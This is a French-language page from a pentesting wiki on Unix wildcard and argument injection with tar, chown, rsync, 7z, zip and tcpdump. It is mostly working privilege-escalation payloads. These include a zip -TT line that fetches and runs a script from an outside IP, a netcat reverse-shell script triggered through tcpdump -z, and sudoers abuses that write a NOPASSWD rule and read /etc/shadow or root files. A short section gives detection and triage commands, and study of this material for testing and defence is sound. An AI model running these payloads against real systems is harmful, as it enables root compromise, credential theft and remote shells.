# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> L’**argument injection** via Wildcard (aka *glob*) se produit lorsqu’un script privilégié exécute un binaire Unix tel que `tar`, `chown`, `rsync`, `zip`, `7z`, … avec un wildcard non placé entre guillemets comme `*`.
> Comme le shell développe le wildcard **avant** d’exécuter le binaire, un attaquant capable de créer des fichiers dans le répertoire de travail peut créer des noms de fichiers commençant par `-`, afin qu’ils soient interprétés comme des **options plutôt que comme des données**, permettant ainsi d’injecter des flags arbitraires, voire des commandes.<sup>[[6]](#references)</sup>
> Cette page rassemble les primitives les plus utiles, les recherches récentes et les méthodes modernes de détection pour 2023-2025.

## chown / chmod

Vous pouvez **copier le propriétaire/groupe ou les bits de permission d’un fichier de référence** en abusant du flag `--reference` lorsqu’un nom de fichier ressemblant à une option est développé par un wildcard.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```
Lorsque root exécute plus tard quelque chose comme :
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
L’option développée `--reference=.drf.php` remplace le propriétaire et le mode explicites, ce qui fait que les fichiers correspondants héritent des métadonnées de `.drf.php` (et, avec la configuration ci-dessus, les rend inscriptibles par l’attaquant).<sup>[[6]](#references)</sup>

*PoC & tool* : [`wildpwn`](https://github.com/localh0t/wildpwn) (attaque combinée).<sup>[[7]](#references)</sup>
Voir également l’article classique de DefenseCode pour plus de détails.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar

Exécutez des commandes arbitraires en exploitant la fonctionnalité **checkpoint** de GNU tar et les actions de checkpoint.<sup>[[10]](#references)</sup>
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```
Une fois que root exécute, par exemple, `tar -czf /root/backup.tgz *`, `shell.sh` est exécuté avec les privilèges de root.<sup>[[10]](#references)</sup>

### bsdtar / particularité du remplacement du compresseur sur macOS

Le `tar` par défaut des versions récentes de macOS (basé sur `libarchive`) ne fournit pas l’interface `--checkpoint` de GNU tar, mais bsdtar documente **--use-compress-program** pour sélectionner un compresseur externe.<sup>[[11]](#references)</sup>
```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Lorsqu’un script privilégié exécute `tar -cf backup.tar *`, cela sélectionne `sh` via le `PATH` de la victime, et bsdtar le lance comme compresseur.<sup>[[11]](#references)</sup> Cela prouve l’injection d’options, mais ne constitue pas en soi une primitive fiable d’exécution de commandes arbitraires : un nom de fichier créé par un wildcard ne peut pas contenir `/`, et bsdtar fournit des données d’archive plutôt qu’une commande shell choisie par l’attaquant. L’exécution de code nécessite en outre un exécutable contrôlable résolu via le `PATH` ou un autre canal d’arguments permettant de nommer un programme utile.

---

## rsync

`rsync` permet de remplacer le shell distant ou le binaire distant via des options de ligne de commande telles que `-e` et `--rsync-path`.<sup>[[12]](#references)</sup>
```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Si root archive ensuite le répertoire avec `rsync -az * backup:/srv/`, le flag injecté peut exécuter un shell via le mécanisme de remote-shell.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC* : [`wildpwn`](https://github.com/localh0t/wildpwn) (mode `rsync`).

---

## 7-Zip / 7z / 7za

Même lorsque le script privilégié préfixe *défensivement* le wildcard avec `--` (pour empêcher l’analyse des options), la CLI de 7-Zip accepte les **fichiers de liste de fichiers** en préfixant le nom de fichier avec `@`. En combinant cela avec un symlink, vous pouvez *exfiltrer des fichiers arbitraires*.<sup>[[13]](#references)</sup>
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Si root exécute quelque chose comme :
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip tentera de lire `root.txt` (→ `/etc/shadow`) comme une liste de fichiers et abandonnera, **affichant le contenu sur stderr**.<sup>[[13]](#references)</sup>

Cela fonctionne malgré `-- *`, car la CLI de 7-Zip accepte explicitement à la fois les noms de fichiers classiques et les `@listfiles` comme entrées positionnelles ; ainsi, un nom de fichier littéral tel que `@root.txt` est tout de même traité de manière spéciale.<sup>[[13]](#references)</sup>

---

## zip

Deux primitives très pratiques existent lorsqu'une application transmet à `zip` des noms de fichiers contrôlés par l'utilisateur (soit via un wildcard, soit en énumérant les noms sans `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook : `-T` active le « test de l'archive » et `-TT <cmd>` remplace le testeur par un programme arbitraire (forme longue : `--unzip-command <cmd>`). Si vous pouvez injecter des noms de fichiers commençant par `-`, répartissez les flags entre plusieurs noms de fichiers distincts afin que l'analyse des short-options fonctionne.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Remarques
- N’essayez PAS d’utiliser un seul nom de fichier comme `'-T -TT <cmd>'` — les options courtes sont analysées caractère par caractère et cela échouera. Utilisez des tokens séparés comme indiqué.<sup>[[3]](#references)</sup>
- Si les slashs sont supprimés des noms de fichiers par l’application, récupérez le contenu depuis un host/IP nu (chemin par défaut `/index.html`) et enregistrez-le localement avec `-O`, puis exécutez-le.<sup>[[3]](#references)</sup>
- Vous pouvez déboguer l’analyse avec `-sc` (afficher les argv traités) ou `-h2` (davantage d’aide) afin de comprendre comment vos tokens sont consommés.<sup>[[3]](#references)</sup>

Exemple (comportement local avec zip 3.0).<sup>[[3]](#references)</sup>
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak : si la couche web renvoie la sortie standard/erreur de `zip` (cas courant avec des wrappers naïfs), des flags injectés comme `--help` ou les échecs provoqués par de mauvaises options apparaîtront dans la réponse HTTP, confirmant la command-line injection et facilitant l'ajustement du payload.<sup>[[3]](#references)</sup>

---

## Additional option-injection candidates

Lorsqu'un wrapper privilégié développe un répertoire accessible en écriture avec un wildcard, ces hooks d'options documentés méritent d'être vérifiés.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binaire | Flag à exploiter | Effet |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Transmettre une chaîne de commande à un shell |
| `git`   | `-c core.sshCommand=<cmd>` | Utiliser `<cmd>` à la place de SSH pour les opérations Git fetch/push |
| `scp`   | `-S <program>` | Utiliser un autre programme de connexion compatible avec SSH |

Ces primitives sont utiles pour effectuer des vérifications au-delà des classiques *tar/rsync/zip*.

---

## Hunting vulnerable wrappers and jobs

Des études de cas récentes et des recommandations de détection montrent que la wildcard/argv injection n'est plus seulement un problème de **cron + tar**.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Cette même classe de bugs continue d'apparaître dans :

- des fonctionnalités web qui « téléchargent tout sous forme de zip/tar » depuis des répertoires d'upload contrôlés par l'attaquant
- des shells de debug de fournisseurs ou d'appliances qui exposent un wrapper **tcpdump** avec des champs de nom de fichier/filtre contrôlés par l'attaquant
- des jobs de backup ou de rotation qui appellent `tar`, `rsync`, `7z`, `zip`, `chown` ou `chmod` sur des répertoires accessibles en écriture

Commandes de triage utiles (l'invocation de `pspy` utilise ses flags documentés relatifs aux événements de processus/fichiers et à l'intervalle).<sup>[[14]](#references)</sup>
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Heuristiques rapides :

- `-- *` est une bonne correction pour de nombreux outils GNU, mais **pas** pour `7z`/`7za`, car les `@listfiles` sont parsés séparément.<sup>[[13]](#references)</sup>
- Pour `zip`, recherchez les wrappers qui énumèrent directement les filenames contrôlés par l’utilisateur ; la séparation des short options (`-T` + `-TT <cmd>`) fonctionne toujours même sans shell glob.<sup>[[2]](#references)[[3]](#references)</sup>
- Pour `tcpdump`, prêtez une attention particulière aux wrappers qui vous permettent de contrôler les **output file names**, les **rotation settings** ou les arguments de **capture-file replay**.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Lorsqu’un restricted shell ou un vendor wrapper construit une ligne de commande `tcpdump` en concaténant des champs contrôlés par l’utilisateur (par exemple un paramètre de "file name") sans escaping/validation stricte, vous pouvez injecter des flags `tcpdump` supplémentaires. La combinaison de `-G` (rotation basée sur le temps), `-W` (limite du nombre de fichiers) et `-z <cmd>` (commande post-rotation) permet une exécution arbitraire de commandes avec les privilèges de l’utilisateur qui exécute tcpdump (souvent root sur les appliances).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Conditions préalables :

- Vous pouvez influencer l’`argv` transmis à `tcpdump` (par exemple via un wrapper comme `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Le wrapper ne nettoie pas les espaces ni les tokens préfixés par `-` dans le champ file name.<sup>[[4]](#references)</sup>

PoC classique (exécute un script de reverse shell depuis un chemin accessible en écriture).<sup>[[4]](#references)[[18]](#references)</sup>
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Détails :

- `-G 1` effectue une rotation chaque seconde, et `-W 1` s’arrête après un fichier ayant subi une rotation ; la capture doit recevoir un paquet correspondant avant la rotation.<sup>[[18]](#references)</sup>
- `-z <cmd>` exécute la commande post-rotation une fois par rotation et lui transmet le chemin du savefile fermé comme argument ; assurez-vous que la gestion des arguments du script/interpréteur correspond à votre payload.<sup>[[18]](#references)</sup>

Variantes sans support amovible :

- Si vous disposez d’une autre primitive pour écrire des fichiers (par exemple, un wrapper de commande distinct qui autorise la redirection de sortie), déposez votre script dans un chemin connu et déclenchez `-z /path/script.sh` ; faites en sorte que le script invoque lui-même `/bin/sh` si nécessaire.<sup>[[18]](#references)</sup>
- Si un wrapper du fournisseur vous permet de choisir le chemin soumis à la rotation, auditez ce contrôle du chemin uniquement en combinaison avec une commande post-rotation qui interprète son argument savefile ; le contrôle du chemin seul n’exécute pas le contenu des fichiers.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump avec des wildcards/arguments supplémentaires → écriture/lecture arbitraire et root

Exemple d’anti-pattern sudoers :<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
La règle laisse plusieurs options disponibles dans le parser documenté de `tcpdump` :<sup>[[3]](#references)[[18]](#references)</sup>
- Le glob `*` et les patterns permissifs ne limitent que le premier argument de `-w`. `tcpdump` accepte plusieurs options `-w` ; la dernière prévaut.<sup>[[3]](#references)[[18]](#references)</sup>
- La règle ne verrouille pas les autres options ; `-Z`, `-r`, `-V`, etc. sont donc autorisées.<sup>[[3]](#references)[[18]](#references)</sup>

Les primitives pertinentes sont documentées ci-dessous.<sup>[[3]](#references)[[18]](#references)</sup>
- Override du chemin de destination avec un second `-w` (le premier satisfait uniquement sudoers).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal à l’intérieur du premier `-w` pour sortir de l’arborescence contrainte.<sup>[[3]](#references)</sup>
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Forcez la propriété de la sortie avec `-Z root` (crée des fichiers appartenant à root n’importe où).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Écriture d’un contenu arbitraire en rejouant un PCAP conçu via `-r` (par exemple, pour ajouter une ligne à sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Créer un PCAP contenant la charge utile ASCII exacte et l’écrire en tant que root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Lecture arbitraire de fichiers/fuite de secrets avec `-V <file>` (interprète une liste de savefiles). Les diagnostics d’erreur réaffichent souvent des lignes, ce qui peut divulguer leur contenu.<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump : Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Chaîne d'exploitation complète](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Shell potentiel via injection de wildcard détectée](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Back To The Future: Les wildcards Unix déchaînés (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [Invocation de `chown` de GNU Coreutils](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [Invocation de `chmod` de GNU Coreutils](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [Checkpoints de GNU tar](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [Manuel de bsdtar(1)](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [Manuel de rsync(1)](https://download.samba.org/pub/rsync/rsync.1)
- [13] [Syntaxe de la ligne de commande de 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [Manuel de flock(1)](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Documentation de configuration de Git](https://git-scm.com/docs/git-config)
- [17] [Manuel de `scp` d'OpenBSD](https://man.openbsd.org/scp)
- [18] [Manuel de tcpdump(8)](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
